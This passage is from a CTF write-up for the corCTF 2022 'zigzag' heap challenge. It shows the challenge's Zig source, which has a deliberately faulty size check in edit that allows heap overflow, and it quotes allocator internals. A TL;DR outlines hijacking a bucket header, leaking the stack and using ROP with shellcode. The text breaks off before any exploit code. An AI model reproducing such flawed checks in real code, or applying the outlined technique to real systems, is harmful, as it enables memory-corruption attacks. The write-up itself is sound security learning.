<!DOCTYPE html>
<html><head>
<title>[corCTF 2022 - pwn] zigzag</title>




<meta charset="utf-8">
<meta name="X-UA-Compatible" content="IE=edge">
<meta name="google-site-verification" content="">
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<meta content="telephone=no" name="format-detection">
<meta name="description" content="">
<meta name="renderer" content="webkit">
<meta name="theme-color" content="#ffffff">



<meta property="og:title" content="[corCTF 2022 - pwn] zigzag" />
<meta property="og:description" content="Introduction zigzag is a zig heap challenge I did during the corCTF 2022 event. It was pretty exotic given we have to pwn a heap like challenge written in zig. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks here.
TL; DR  Understanding zig GeneralPurposeAllocator internals Hiijack the BucketHeader of a given bucket to get a write what were / read what where primitive." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://clubsecuesiea.github.io/posts/zigzag/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-08-08T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-08-08T00:00:00+00:00" /><meta property="og:site_name" content="ESIEA security club" />






<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[corCTF 2022 - pwn] zigzag"/>
<meta name="twitter:description" content="Introduction zigzag is a zig heap challenge I did during the corCTF 2022 event. It was pretty exotic given we have to pwn a heap like challenge written in zig. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks here.
TL; DR  Understanding zig GeneralPurposeAllocator internals Hiijack the BucketHeader of a given bucket to get a write what were / read what where primitive."/>







<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">


  






<link rel="stylesheet" href="/scss/journal.min.c5d92f380bf10f6849c7ac487c7df2b22c081e0851e5339224f1ae29210b20d2.css" integrity="sha256-xdkvOAvxD2hJx6xIfH3ysiwIHghR5TOSJPGuKSELINI=" media="screen">



<link rel="stylesheet" href="/scss/dark-mode.min.9f8d8c2df9285089d141edd4a50cb7506c7948e6ab79a29968dced1bd0ab7d22.css" integrity="sha256-n42MLfkoUInRQe3UpQy3UGx5SOareaKZaNztG9CrfSI=" media="screen">


<script src="/vendor/js/loadCSS.js"></script>
<script>
  loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
</script>




<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"></script>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        renderMathInElement(document.body, {
          
          
          delimiters: [
              {left: '$$', right: '$$', display: true},
              {left: '$', right: '$', display: false},
              {left: '\\(', right: '\\)', display: false},
              {left: '\\[', right: '\\]', display: true}
          ],
          
          throwOnError : false
        });
    });
</script>



  <script src="/js/toc.js"></script>



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
<script src="/vendor/js/md5.min.js"></script>
<script>
  var gitalk = new Gitalk({
  clientID: '',
  clientSecret: '',
  repo: '',
  owner: '',
  admin: [''],
  id: md5(location.pathname),
  distractionFreeMode: 'false'
  });
  window.onload = function () {
        gitalk.render('gitalk-container')
  }
</script>












</head>
<body>
    	<div id="app"><div id="sideContainer" class="side-container">
    
    <a class="a-block nav-head false" href="http://clubsecuesiea.github.io/">
    
        <div class="nav-title">
            ESIEA security club
        </div>
        
    </a>

    <div class="nav-link-list">
        
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/posts/about/">
                About us
            </a>
            
        
            
            
            
                
            
            
            
            <a class="a-block nav-link-item active" href="/posts">
                Archive
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/categories">
                Categories
            </a>
            
        
            
            
            
            
            
            <a class="a-block nav-link-item false" href="/tags">
                Tags
            </a>
            
        
    </div>

    

    <div class="nav-footer">
        
Hugo Theme <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a> by <a href="https://risehere.net/">Rise</a>
<br>
Ported from <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	Beerware shit
	

    </div>
    
</div><div id="extraContainer" class="extra-container">
    
    
    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#introduction" onclick="onNavClick(`#introduction-nav`)" id="introduction-nav">
									Introduction
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tl-dr" onclick="onNavClick(`#tl-dr-nav`)" id="tl-dr-nav">
									TL; DR
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#source-code-analysis" onclick="onNavClick(`#source-code-analysis-nav`)" id="source-code-analysis-nav">
									Source code analysis
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#generalpurposeallocator-abstract" onclick="onNavClick(`#generalpurposeallocator-abstract-nav`)" id="generalpurposeallocator-abstract-nav">
									GeneralPurposeAllocator abstract
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#getting-read--write-what-were-primitive" onclick="onNavClick(`#getting-read--write-what-were-primitive-nav`)" id="getting-read--write-what-were-primitive-nav">
									Getting read / write what were primitive
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#leak-stack" onclick="onNavClick(`#leak-stack-nav`)" id="leak-stack-nav">
									Leak stack
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#rop" onclick="onNavClick(`#rop-nav`)" id="rop-nav">
									ROP
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#profit" onclick="onNavClick(`#profit-nav`)" id="profit-nav">
									PROFIT
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#appendices" onclick="onNavClick(`#appendices-nav`)" id="appendices-nav">
									Appendices
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
    
    <div class="pagination">
        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
            <i class="material-icons pagination-action-icon">
                keyboard_arrow_up
            </i>
        </a>
        
        <a type="button" class="pagination-action" id="darkModeToggleButton">
            <span class="material-icons pagination-action-icon" id="darkModeToggleIcon">
                dark_mode
            </span>
        </a>
        
        
    </div>
</div>
<div class="single-column-drawer-container" id="drawer"
     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
    <div class="drawer-content">
        <div class="drawer-menu">
            
            
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/posts/about/">
                    About us
                </a>
                
            
                
                
                
                    
                
                
                
                <a class="a-block drawer-menu-item active" href="/posts">
                    Archive
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/categories">
                    Categories
                </a>
                
            
                
                
                
                
                
                <a class="a-block drawer-menu-item false" href="/tags">
                    Tags
                </a>
                
            
            
            <div class="toc">


	<div class="toc-content">
	
		
		
		
		<center>- CATALOG -</center>
		
		
		<ul>
			
				
				
					
						
						
						
						
							
								
									<ul>
								
							
						
						
							<li>
								<a href="#introduction" onclick="onNavClick(`#introduction-nav`)" id="introduction-nav">
									Introduction
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#tl-dr" onclick="onNavClick(`#tl-dr-nav`)" id="tl-dr-nav">
									TL; DR
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#source-code-analysis" onclick="onNavClick(`#source-code-analysis-nav`)" id="source-code-analysis-nav">
									Source code analysis
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#generalpurposeallocator-abstract" onclick="onNavClick(`#generalpurposeallocator-abstract-nav`)" id="generalpurposeallocator-abstract-nav">
									GeneralPurposeAllocator abstract
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#getting-read--write-what-were-primitive" onclick="onNavClick(`#getting-read--write-what-were-primitive-nav`)" id="getting-read--write-what-were-primitive-nav">
									Getting read / write what were primitive
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#leak-stack" onclick="onNavClick(`#leak-stack-nav`)" id="leak-stack-nav">
									Leak stack
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#rop" onclick="onNavClick(`#rop-nav`)" id="rop-nav">
									ROP
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#profit" onclick="onNavClick(`#profit-nav`)" id="profit-nav">
									PROFIT
								</a>
							</li>
						
						
					
				
			
				
				
					
						
						
						
						
						
							<li>
								<a href="#appendices" onclick="onNavClick(`#appendices-nav`)" id="appendices-nav">
									Appendices
								</a>
							</li>
						
						
					
				
			
		</ul>
	</div>

</div>
            
        </div>
    </div>
</div>
<transition name="fade">
    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
</transition>
<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
    <div id="navBackground" class="nav-background"></div>
    <div class="container container-narrow nav-content">
        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
            <i class="material-icons">
                menu
            </i>
        </button>
        <a id="navTitle" class="navbar-brand" href="http://clubsecuesiea.github.io/">
            ESIEA security club
        </a>
        
        <button type="button" class="nav-darkmode-toggle" id="darkModeToggleButton2">
            <i class="material-icons" id="darkModeToggleIcon2">
                dark_mode
            </i>
        </button>
        
    </div>
</nav>
<div class="single-column-header-container" id="pageHead"
     v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }">
    <a href="http://clubsecuesiea.github.io/">
        <div class="single-column-header-title">ESIEA security club</div>
        

    </a>
</div>

            <div id="content">
                <div id="streamContainer" class="stream-container">

    <div class="post-list-container post-list-container-shadow">
        <div class="post">
            
            
            

            <div class="post-head-wrapper-text-only"
                
            >
                <div class="post-title">
                    [corCTF 2022 - pwn] zigzag
                    
                    <div class="post-meta">
                        
                        <time itemprop="datePublished">
                            2022-08-08 00:00
                        </time>
                        

                        
                            <i class="material-icons" style="">folder</i>
                                <a href="/categories/pwn">pwn</a>
                                &nbsp;
                        

                        
                            <i class="material-icons" style="">label</i>
                            
                                <a href="/tags/ctf">ctf</a>
                                &nbsp;
                            
                                <a href="/tags/corctf">corCTF</a>
                                &nbsp;
                            
                                <a href="/tags/2022">2022</a>
                                &nbsp;
                            
                                <a href="/tags/heap">heap</a>
                                &nbsp;
                            
                                <a href="/tags/nasm">nasm</a>
                                &nbsp;
                            
                                <a href="/tags/pwn">pwn</a>
                                &nbsp;
                            
                                <a href="/tags/zig">zig</a>
                                &nbsp;
                            
                        
                        
                    </div>
                </div>
            </div>
            
            <div class="post-body-wrapper">
                
                <div class="post-body" v-pre>
                
                    <h2 id="introduction">Introduction</h2>
<p><code>zigzag</code> is a zig heap challenge I did during the <a href="https://ctftime.org/event/1656">corCTF 2022</a> event. It was pretty exotic given we have to pwn a heap like challenge written in <a href="https://ziglang.org/">zig</a>. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks <a href="https://github.com/ret2school/ctf/tree/master/2022/corCTF/pwn/zieg">here</a>.</p>
<h2 id="tl-dr">TL; DR</h2>
<ul>
<li>Understanding zig <code>GeneralPurposeAllocator</code> internals</li>
<li>Hiijack the <code>BucketHeader</code> of a given bucket to get a write what were / read what where primitive.</li>
<li>Leak stack + ROP on the fileRead function (mprotect + shellcode)</li>
<li>PROFIT</li>
</ul>
<h2 id="source-code-analysis">Source code analysis</h2>
<p>The source code is procided:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#75715e">// zig build-exe main.zig -O ReleaseSmall
</span><span style="color:#75715e">// built with zig version: 0.10.0-dev.2959+6f55b294f
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">const</span> std <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>import(<span style="color:#e6db74">&#34;std&#34;</span>);
<span style="color:#66d9ef">const</span> fmt <span style="color:#f92672">=</span> std.fmt;

<span style="color:#66d9ef">const</span> stdout <span style="color:#f92672">=</span> std.io.getStdOut().writer();
<span style="color:#66d9ef">const</span> stdin <span style="color:#f92672">=</span> std.io.getStdIn();

<span style="color:#66d9ef">const</span> MAX_SIZE: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x500</span>;
<span style="color:#66d9ef">const</span> ERR: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xbaad0000</span>;
<span style="color:#66d9ef">const</span> NULL: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdead0000</span>;

var chunklist: [<span style="color:#ae81ff">20</span>][]<span style="color:#66d9ef">u8</span> <span style="color:#f92672">=</span> undefined;

var gpa <span style="color:#f92672">=</span> std.heap.GeneralPurposeAllocator(.{}){};
<span style="color:#66d9ef">const</span> allocator <span style="color:#f92672">=</span> gpa.allocator();

<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">menu</span>() <span style="color:#f92672">!</span>void {
    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;[1] Add\n&#34;</span>, .{});
    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;[2] Delete\n&#34;</span>, .{});
    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;[3] Show\n&#34;</span>, .{});
    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;[4] Edit\n&#34;</span>, .{});
    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;[5] Exit\n&#34;</span>, .{});
    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;&gt; &#34;</span>, .{});
}

<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">readNum</span>() <span style="color:#f92672">!</span><span style="color:#66d9ef">usize</span> {
    var buf: [<span style="color:#ae81ff">64</span>]<span style="color:#66d9ef">u8</span> <span style="color:#f92672">=</span> undefined;
    var stripped: []<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">u8</span> <span style="color:#f92672">=</span> undefined;
    var amnt: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;
    var num: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;

    amnt <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> stdin.read(<span style="color:#f92672">&amp;</span>buf);
    stripped <span style="color:#f92672">=</span> std.mem.trimRight(<span style="color:#66d9ef">u8</span>, buf[<span style="color:#ae81ff">0</span><span style="color:#f92672">..</span>amnt], <span style="color:#e6db74">&#34;\n&#34;</span>);

    num <span style="color:#f92672">=</span> fmt.parseUnsigned(<span style="color:#66d9ef">usize</span>, stripped, <span style="color:#ae81ff">10</span>) catch {
        <span style="color:#66d9ef">return</span> ERR;
    };

    <span style="color:#66d9ef">return</span> num;
}

<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">add</span>() <span style="color:#f92672">!</span>void {
    var idx: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;
    var size: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Index: &#34;</span>, .{});
    idx <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> readNum();

    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">==</span> ERR or idx <span style="color:#f92672">&gt;=</span> chunklist.len or <span style="color:#f92672">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#f92672">!=</span> NULL) {
        <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Invalid index!\n&#34;</span>, .{});
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Size: &#34;</span>, .{});
    size <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> readNum();

    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">==</span> ERR or size <span style="color:#f92672">&gt;=</span> MAX_SIZE) {
        <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Invalid size!\n&#34;</span>, .{});
        <span style="color:#66d9ef">return</span>;
    }

    chunklist[idx] <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> allocator.alloc(<span style="color:#66d9ef">u8</span>, size);

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Data: &#34;</span>, .{});
    _ <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> stdin.read(chunklist[idx]);
}

<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">delete</span>() <span style="color:#f92672">!</span>void {
    var idx: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Index: &#34;</span>, .{});
    idx <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> readNum();

    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">==</span> ERR or idx <span style="color:#f92672">&gt;=</span> chunklist.len or <span style="color:#f92672">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#f92672">==</span> NULL) {
        <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Invalid index!\n&#34;</span>, .{});
        <span style="color:#66d9ef">return</span>;
    }

    _ <span style="color:#f92672">=</span> allocator.free(chunklist[idx]);

    chunklist[idx].ptr <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>intToPtr([<span style="color:#f92672">*</span>]<span style="color:#66d9ef">u8</span>, NULL);
    chunklist[idx].len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">show</span>() <span style="color:#f92672">!</span>void {
    var idx: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Index: &#34;</span>, .{});
    idx <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> readNum();

    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">==</span> ERR or idx <span style="color:#f92672">&gt;=</span> chunklist.len or <span style="color:#f92672">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#f92672">==</span> NULL) {
        <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Invalid index!\n&#34;</span>, .{});
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;{s}\n&#34;</span>, .{chunklist[idx]});
}

<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">edit</span>() <span style="color:#f92672">!</span>void {
    var idx: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;
    var size: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Index: &#34;</span>, .{});
    idx <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> readNum();

    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">==</span> ERR or idx <span style="color:#f92672">&gt;=</span> chunklist.len or <span style="color:#f92672">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#f92672">==</span> NULL) {
        <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Invalid index!\n&#34;</span>, .{});
        <span style="color:#66d9ef">return</span>;
    }

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Size: &#34;</span>, .{});
    size <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> readNum();

    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&gt;</span> chunklist[idx].len and size <span style="color:#f92672">==</span> ERR) {
        <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Invalid size!\n&#34;</span>, .{});
        <span style="color:#66d9ef">return</span>;
    }

    chunklist[idx].len <span style="color:#f92672">=</span> size;

    <span style="color:#66d9ef">try</span> stdout.print(<span style="color:#e6db74">&#34;Data: &#34;</span>, .{});
    _ <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> stdin.read(chunklist[idx]);
}

<span style="color:#66d9ef">pub</span> <span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">main</span>() <span style="color:#f92672">!</span>void {
    var choice: <span style="color:#66d9ef">usize</span> <span style="color:#f92672">=</span> undefined;

    <span style="color:#66d9ef">for</span> (chunklist) <span style="color:#f92672">|</span>_, i<span style="color:#f92672">|</span> {
        chunklist[i].ptr <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>intToPtr([<span style="color:#f92672">*</span>]<span style="color:#66d9ef">u8</span>, NULL);
        chunklist[i].len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    }

    <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
        <span style="color:#66d9ef">try</span> menu();

        choice <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> readNum();
        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> ERR) <span style="color:#66d9ef">continue</span>;

        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">try</span> add();
        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">try</span> delete();
        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) <span style="color:#66d9ef">try</span> show();
        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>) <span style="color:#66d9ef">try</span> edit();
        <span style="color:#66d9ef">if</span> (choice <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) <span style="color:#66d9ef">break</span>;
    }
}
</code></pre></div><p>The source code is quite readable, the vulnerability is the overflow within the <code>edit</code> function. The check onto the provided size isn&rsquo;t efficient, <code>size &gt; chunklist[idx].len and size == ERR</code>, if <code>size &gt; chunklist[idx].len</code> and if <code>size != ERR</code> the condition is false. Which means we can edit the chunk by writing an arbitrary amount of data in it.</p>
<h2 id="generalpurposeallocator-abstract">GeneralPurposeAllocator abstract</h2>
<p>The <a href="https://github.com/ziglang/zig/">zig</a> source is quite readable so let&rsquo;s take a look at the internals of the GeneralPurposeAllocator allocator.
The GeneralPurposeAllocator is implemented <a href="https://github.com/ziglang/zig/blob/master/lib/std/heap/general_purpose_allocator.zig">here</a>.
The header of the source code file gives the basic design of the allocator:</p>
<pre tabindex="0"><code>//! ## Basic Design:
//!
//! Small allocations are divided into buckets:
//!
//! ```
//! index obj_size
//! 0     1
//! 1     2
//! 2     4
//! 3     8
//! 4     16
//! 5     32
//! 6     64
//! 7     128
//! 8     256
//! 9     512
//! 10    1024
//! 11    2048
//! ```
//!
//! The main allocator state has an array of all the &quot;current&quot; buckets for each
//! size class. Each slot in the array can be null, meaning the bucket for that
//! size class is not allocated. When the first object is allocated for a given
//! size class, it allocates 1 page of memory from the OS. This page is
//! divided into &quot;slots&quot; - one per allocated object. Along with the page of memory
//! for object slots, as many pages as necessary are allocated to store the
//! BucketHeader, followed by &quot;used bits&quot;, and two stack traces for each slot
//! (allocation trace and free trace).
//!
//! The &quot;used bits&quot; are 1 bit per slot representing whether the slot is used.
//! Allocations use the data to iterate to find a free slot. Frees assert that the
//! corresponding bit is 1 and set it to 0.
//!
//! Buckets have prev and next pointers. When there is only one bucket for a given
//! size class, both prev and next point to itself. When all slots of a bucket are
//! used, a new bucket is allocated, and enters the doubly linked list. The main
//! allocator state tracks the &quot;current&quot; bucket for each size class. Leak detection
//! currently only checks the current bucket.
//!
//! Resizing detects if the size class is unchanged or smaller, in which case the same
//! pointer is returned unmodified. If a larger size class is required,
//! `error.OutOfMemory` is returned.
//!
//! Large objects are allocated directly using the backing allocator and their metadata is stored
//! in a `std.HashMap` using the backing allocator.
</code></pre><p>Let&rsquo;s take a look at <code>alloc</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">alloc</span>(self: <span style="color:#f92672">*</span>Self, len: <span style="color:#66d9ef">usize</span>, ptr_align: <span style="color:#a6e22e">u29</span>, len_align: <span style="color:#a6e22e">u29</span>, ret_addr: <span style="color:#66d9ef">usize</span>) Error<span style="color:#f92672">!</span>[]<span style="color:#66d9ef">u8</span> {
    self.mutex.lock();
    defer self.mutex.unlock();

    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>self.isAllocationAllowed(len)) {
        <span style="color:#66d9ef">return</span> error.OutOfMemory;
    }

    <span style="color:#66d9ef">const</span> new_aligned_size <span style="color:#f92672">=</span> math.max(len, ptr_align);
    <span style="color:#66d9ef">if</span> (new_aligned_size <span style="color:#f92672">&gt;</span> largest_bucket_object_size) {
        <span style="color:#66d9ef">try</span> self.large_allocations.ensureUnusedCapacity(self.backing_allocator, <span style="color:#ae81ff">1</span>);
        <span style="color:#66d9ef">const</span> slice <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> self.backing_allocator.rawAlloc(len, ptr_align, len_align, ret_addr);

        <span style="color:#66d9ef">const</span> gop <span style="color:#f92672">=</span> self.large_allocations.getOrPutAssumeCapacity(<span style="color:#f92672">@</span>ptrToInt(slice.ptr));
        <span style="color:#66d9ef">if</span> (config.retain_metadata and <span style="color:#f92672">!</span>config.never_unmap) {
            <span style="color:#75715e">// Backing allocator may be reusing memory that we&#39;re retaining metadata for
</span><span style="color:#75715e"></span>            assert(<span style="color:#f92672">!</span>gop.found_existing or gop.value_ptr.freed);
        } <span style="color:#66d9ef">else</span> {
            assert(<span style="color:#f92672">!</span>gop.found_existing); <span style="color:#75715e">// This would mean the kernel double-mapped pages.
</span><span style="color:#75715e"></span>        }
        gop.value_ptr.bytes <span style="color:#f92672">=</span> slice;
        <span style="color:#66d9ef">if</span> (config.enable_memory_limit)
            gop.value_ptr.requested_size <span style="color:#f92672">=</span> len;
        gop.value_ptr.captureStackTrace(ret_addr, .alloc);
        <span style="color:#66d9ef">if</span> (config.retain_metadata) {
            gop.value_ptr.freed <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
            <span style="color:#66d9ef">if</span> (config.never_unmap) {
                gop.value_ptr.ptr_align <span style="color:#f92672">=</span> ptr_align;
            }
        }

        <span style="color:#66d9ef">if</span> (config.verbose_log) {
            log.info(<span style="color:#e6db74">&#34;large alloc {d} bytes at {*}&#34;</span>, .{ slice.len, slice.ptr });
        }
        <span style="color:#66d9ef">return</span> slice;
    }

    <span style="color:#66d9ef">const</span> new_size_class <span style="color:#f92672">=</span> math.ceilPowerOfTwoAssert(<span style="color:#66d9ef">usize</span>, new_aligned_size);
    <span style="color:#66d9ef">const</span> ptr <span style="color:#f92672">=</span> <span style="color:#66d9ef">try</span> self.allocSlot(new_size_class, ret_addr);
    <span style="color:#66d9ef">if</span> (config.verbose_log) {
        log.info(<span style="color:#e6db74">&#34;small alloc {d} bytes at {*}&#34;</span>, .{ len, ptr });
    }
    <span style="color:#66d9ef">return</span> ptr[<span style="color:#ae81ff">0</span><span style="color:#f92672">..</span>len];
}
</code></pre></div><p>First in <code>alloc</code>, if the aligned size is not larger than the largest bucket capacity (2**11) it will call <code>allocSlot</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#66d9ef">fn</span> <span style="color:#a6e22e">allocSlot</span>(self: <span style="color:#f92672">*</span>Self, size_class: <span style="color:#66d9ef">usize</span>, trace_addr: <span style="color:#66d9ef">usize</span>) Error<span style="color:#f92672">!</span>[<span style="color:#f92672">*</span>]<span style="color:#66d9ef">u8</span> {
